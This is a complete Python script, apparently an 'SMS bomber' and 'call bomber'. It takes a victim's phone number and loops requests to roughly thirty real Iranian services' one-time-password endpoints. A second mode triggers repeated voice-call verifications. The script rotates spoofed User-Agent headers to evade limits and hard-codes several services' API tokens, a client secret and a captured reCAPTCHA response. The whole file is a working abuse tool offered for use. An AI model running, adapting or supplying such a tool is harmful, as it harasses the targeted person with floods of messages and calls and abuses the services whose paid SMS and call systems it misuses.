    import requests,time,random
heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
random_head = random.choice(heads)
number = input("please enter your number: ")
while len(number) != 10 or number[0] == '0':
    if number[0] == '0':
        number = number[1:]
    if number[0:3] == '+98':
        number = number[3:]
    if len(number) != 10:
        number = input("Enter the correct number: ")  
print(number)
num98 = '+98' + number
num0 = '0' + number
op = int(input('''select an option:
1:sms bomber
2:call bomber
'''))
if op == 1:
    ketab_api='https://c.ketab.ir/api/api/services/app/Account/SendValidationCode'
    ketab_req = {"mobileNumber":num0}
    irantic_api = '	https://www.irantic.com/api/login/authenticate'
    irantic_req = {"mobile":num0}
    lendo_api = 'https://api.lendo.ir/api/customer/auth/send-otp'
    lendo_req = {"mobile":num0}
    pindo_api = 'https://api.pindo.ir/v1/user/login-register/'
    pindo_req = {"phone":num0}
    wisgoon_api = 'https://gateway.wisgoon.com/api/v1/auth/login/'
    wisgoon_req = {"token":"e622c330c77a17c8426e638d7a85da6c2ec9f455","phone":num0,"recaptcha-response":"03AL8dmw8z-bWiY2qpusl44mS0BVHrB--bPqpekgULfeLbwGEXcgW-lwbgMLFHsZjDXDh9F9e2R0pqiBxUx9AqM_EXFNhQc0LrCDbWNg5H3Hk2BHCVcJOdPZuX-3c37mLGedvhRsCy6h0xTME8BOHnlhQj_BVtj729eZZiVDSE-njVGA0phM8VCRw9oz6JK0VwQfkdc9tVdfVdc0Saj1OUDXwmNo9VEpTQgtElqsb5EBlqDpsYYj1G_ZkNmIUSeOzdRwv7Tm-f0pMdYKGmSPNOdanasVo4iCqtSNSslsq9MZz3R0bn3oIrdZ138EVwpViO5tUkV7pJXKCd8DU46ZMvjR_Ekq3Et8lfz8oBNqf1XU6Zl0Hnt58FEYa4MVWYC6hqPToF04fJGixntAbrhXgz0KImSusf7kHfqGEtx07cu7JeSHdl37SzMh-AAGiNiVE31crxTHBk6_Z5M3b_QGjOdIkczLWlqQIYeXYHMt3IG3IzrrR5x2V1Rl9uQHcd5xZd85WtR4h9_Qd3S8x9kw4i-bNFQXj6xXFQ9G_B5PimKJcKwMwcScSZjHlhnulYlM9WYefOWoYO4TFG8D1Y61HOKf1SBadt3VfEieIxA58tsZR4E1ny22KmcazTMpbsf9T2Tjc0eONqA8yIpNohwhaK6Nr6q3joutLSrmyFfjdKVHTULeeZw1PGlSHzm5_mEPut5-TFkfW69j41-dLfgLVEr8EKCAE_Bezu0AaJkbfTuwEJ59Ek2W3843-VSDaZDmaKJ3SfcXYWLChRpsKcZ3mUDBTUC823lIrTW1rc7dEWtfMPXdx1mK8FBAzk9UeoTkDH89UkuoG7f3noWsCXO1kCe_qb8L7XTcFy2GIwYppdMSYT-AVBbe0jtBzxCRz1NB7d_QvogDuw9XldvoLdZ-LZ4NQ1twbewlSr_UG7JOrKLld5et8-I6gnmCRysE6KfMy5SU_jz_Ms0d9_YLueoRgylcG_fX6i1ZToI04vulOKvCL2V1FjvdZrYzytAKs8ccTp1ABn_Ba3R_3RONMMuCvaA-nHeXNLlKjxaO_M49n61b97y0bQNrtk57NNUTkRoXXBCPLMU3w8PowYQMbsmx7sS3KhoK4n4LvAjcmmlCqgJ54bjvuQunwO2Fta4nyKCaSReKJt5EqAuKVmVKvAFU9GC33gYwBjC0AOuEM1zNdKeOmg62uUcXoTSMJ0fkaw0zYwgWYJjnM_081-dzzdxoPAFiUjOllaBPxAIJECOgmUubZm9JlI7HzmPZsMwt91kKjaZ7ks4vST4RxnC73sTekbsuvhI7NIUnEt1D20aujW4Y5oGoJZTHGlhYRLm3VtC1WwRirgkpv6Yta7VUGB_WTzPsRC3PNpgoAuje3plK6uJZtn9Hwb9nE02SRLypo1EdBzHF7NmgAmQxE-4cd4IfyxrrD_2OCHdJqxTg"}
    gap_api = api = 'https://core.gap.im/v1/user/add.json?mobile={0}'.format(num98)
    timche_api = 'https://api.timcheh.com/auth/otp/send'
    timshe_req = {"mobile":num0}
    hmrahmk_api = 'https://www.hamrah-mechanic.com/api/v1/membership/otp'
    hmrahmk_req = {"PhoneNumber":num0,"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","referrer":"https://www.google.com/"}
    miar_api = 'https://www.miare.ir/api/otp/driver/request/'
    miar_req = {"phone_number":num0}
    gapf_api = 'https://supercore.gapfilm.ir/api/v3.1/Account/Login'
    gapf_req = {"Type":3,"Username":num0}
    bani_api = 'https://mobapi.banimode.com/api/v2/auth/request'
    bani_req = {"phone":num0}
    snaf_api = 'https://api.snappfood.biz/v1/otp'
    snaf_req = {"Phone":num0}
    food4_api = 'https://foodforkish.ir/public/api/generate-otp-for-login'
    food4_req = {"phone":num0,"email":"09123456789@foodforkish.ir"}
    dli_api = 'https://www.delino.com/user/register'
    dli_req = {'mobile':num0}
    deli_api = 'https://restaurant.delino.com/user/register'
    deli_req = {"apiToken":"uU58ZSLtbAN6s3i4Wej02yUScmxUGlhWLlShUqifz1fc2wy20aXmBpc70lewe2nz","clientSecret":"9jEhEPLdEcrKAVvgQDty8jvaJRyq1cTS","device":"web","username":num0}
    bazar_api = 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest'
    bazar_req = {"properties":{"language":2,"clientID":"cigvc5y1q0u8qf0ryfkn41t29tloxql1","deviceID":"cigvc5y1q0u8qf0ryfkn41t29tloxql1","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":'98'+number}}}
    zood_api = 'https://admin.zoodex.ir/api/v1/login/check'
    zood_req = {"mobile":num0}
    momi_api = 'https://mamifood.org/Registration.aspx/SendValidationCode'
    momi_req = {"Phone":num0,"did":"a4d1daf8-6ae4-49df-8ba9-2e870ce39e0c"}
    tagh_api = 'https://gw.taaghche.com/v4/site/auth/login'
    tagh_req = {"contact":num0,"forceOtp":'false'}
    behno_api = 'https://bck.behtarino.com/api/v1/users/phone_verification/'
    behno_req = {"phone":num0}
    hzpo_api = 'https://api.behtarino.com/api/v2/businesses/cszhctxwww/vitrin-verification/'
    hzpo_req= {"phone":num0}
    namav_api = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
    namav_req = {"UserName":num98}
    balad_api = 'https://account.api.balad.ir/api/web/auth/login/'
    balad_req =  {"phone_number":num0,"os_type":"W"}
    poltak_api = 'https://poltalk.me/api/v1/auth/phone'
    poltak_req = {"phone":num0}
    quby_api = 'https://quby.ir/AppApi/Api/User/RequestOTP'
    quby_req = {'phone':num0}
    setare1_api = 'https://api.setareyek.ir/V2/User/Register'
    setare1_req = {"PhoneNumber":num0}
    komoda_api = 'https://api.komodaa.com/api/v2.6/loginRC/request'
    komoda_req = {'phone_number':num0} 
    alib_api = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
    alib_req = {'phoneNumber':number}
    snap_api = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
    snap_req = {"cellphone":num98}
    div_api  = 'https://api.divar.ir/v5/auth/authenticate'
    div_req = {"phone":number}
    tap_api = 'https://api.tapsi.cab/api/v2.2/user'
    tap_req = {"credential":{"phoneNumber":num0,"role":"PASSENGER"},"otpOption":"SMS"}
    okal_api = 'https://api-react.okala.com/C/CustomerAccount/OTPRegister'
    okala_req = {"mobile":num0,"confirmTerms":'true',"notRobot":'false'}
    while True :
        ketabb = requests.post(ketab_api,json= ketab_req)
        iranticc = requests.post(irantic_api,json= irantic_req)
        lendoo = requests.post(lendo_api,json= lendo_req)
        pindoo = requests.post(pindo_api,json= pindo_req)
        wisgoonn = requests.post(wisgoon_api,json=wisgoon_req)
        gapp = requests.post(gap_api)
        timchee = requests.post(timche_api,json=timshe_req)
        tapsii = requests.post(tap_api , json = tap_req,headers=random_head)
        snapp = requests.post(snap_api , json = snap_req,headers=random_head)
        divarr = requests.post(div_api,json = div_req,headers=random_head)
        alibabaa = requests.post(alib_api, json = alib_req,headers=random_head)
        komodaa = requests.post(komoda_api, json = komoda_req,headers=random_head) #call and sms
        setareyekk = requests.post(setare1_api, json = setare1_req,headers=random_head)
        qubyy = requests.post(quby_api,json = quby_req,headers=random_head)
        poltakk = requests.post(poltak_api, json = poltak_req,headers=random_head)
        baladd = requests.post(balad_api,json = balad_req,headers=random_head)
        namavaa = requests.post(namav_api, json=namav_req,headers=random_head)
        hzpowerr = requests.post(hzpo_api,json = hzpo_req,headers=random_head)
        behtarinno = requests.post(behno_api,behno_req,headers=random_head)
        okalaa = requests.post(okal_api,json=okala_req,headers=random_head)
        hmrahmk = requests.post(hmrahmk_api,json=hmrahmk_req,headers=random_head)
        taghchee = requests.post(tagh_api,json=tagh_req,headers=random_head)
        momifoodd = requests.post(momi_api,json = momi_req,headers=random_head)
        zoodexx = requests.post(zood_api,json = zood_req,headers=random_head)
        bazarr = requests.post(bazar_api,json = bazar_req,headers=random_head)
        delinoo = requests.post(deli_api,json=deli_req,headers=random_head)
        dlinoo = requests.post(dli_api,json=dli_req,headers=random_head)
        food4kishh = requests.post(food4_api,json = food4_req,headers=random_head)
        snapfoodd = requests.post(snaf_api,json = snaf_req,headers=random_head)
        banimodd = requests.post(bani_api,bani_req,headers=random_head)
        gapfilmm = requests.post(gapf_api,json = gapf_req,headers=random_head)
        miaree = requests.post(miar_api,json= miar_req,headers=random_head)
        print('divar:',divarr.status_code)
        print('snap:',snapp.status_code)
        print('tapsi:',tapsii.status_code)
        print('alibaba:',alibabaa.status_code)
        print('komoda:',komodaa.status_code) 
        print("setareyek:",setareyekk.status_code)
        print("quby:",qubyy.status_code)
        print("poltak:",poltakk.status_code)
        print("balad:",baladd.status_code)
        print("namava:",namavaa.status_code)
        print("hzpower:",hzpowerr.status_code)
        print("behtarino:",behtarinno.status_code)
        print("okala:",okalaa.status_code)
        print("taghche:",taghchee.status_code)
        print("mamifood:",momifoodd.status_code)
        print('zoodex:',zoodexx.status_code)
        print('bazar:',bazarr.status_code)
        print("rest 7khan:",delinoo.status_code)
        print("rest delino:",dlinoo.status_code)
        print("rest f4k:",food4kishh.status_code)
        print("snap food:",snapfoodd.status_code)
        print("banimod:",banimodd.status_code)
        print("gapfilm:",gapfilmm.status_code)
        print('miare',miaree.status_code)
        print('hmrahmekanik',hmrahmk.status_code)
        print('timche:',timchee.status_code)
        print('Gap:',gapp.status_code)
        print('wisgoon:',wisgoonn.status_code)
        print('pindo:',pindoo.status_code)
        print('lendo:',lendoo.status_code)
        print('irantic:',iranticc.status_code)
        print('ketab.c:',ketabb.status_code)

        time.sleep(10)
elif op == 2:
    print("ctrl+c to cancel the program")
    while True :
        bani_api = 'https://mobapi.banimode.com/api/v2/auth/request'
        bani_req2 = {"phone":num0,"type":"call"} 
        banimodd2 = requests.post(bani_api,bani_req2,headers= random_head)
        print("banimod:",banimodd2.status_code)
        time.sleep(10)
        komoda_api = 'https://api.komodaa.com/api/v2.6/loginRC/request'
        komoda_req = {'phone_number':num0}
        komodaa = requests.post(komoda_api, json = komoda_req,headers= random_head)
        print('komoda:',komodaa.status_code)
        time.sleep(10)
        api = 'https://ws.alibaba.ir/api/v3/account/call/otp'
        req = {"phoneNumber":number}
        alibabaa = requests.post(api,json= req)
        print('alibaba:',alibabaa.status_code)
        time.sleep(10)
        gap_api = 'https://core.gap.im/v1/user/resendCode.json?mobile=+98{0}&type=IVR'.format(number) 
        gapp = requests.post(gap_api)
        print('gap:',gapp.status_code)
        time.sleep(10)
else:
    print("-_-")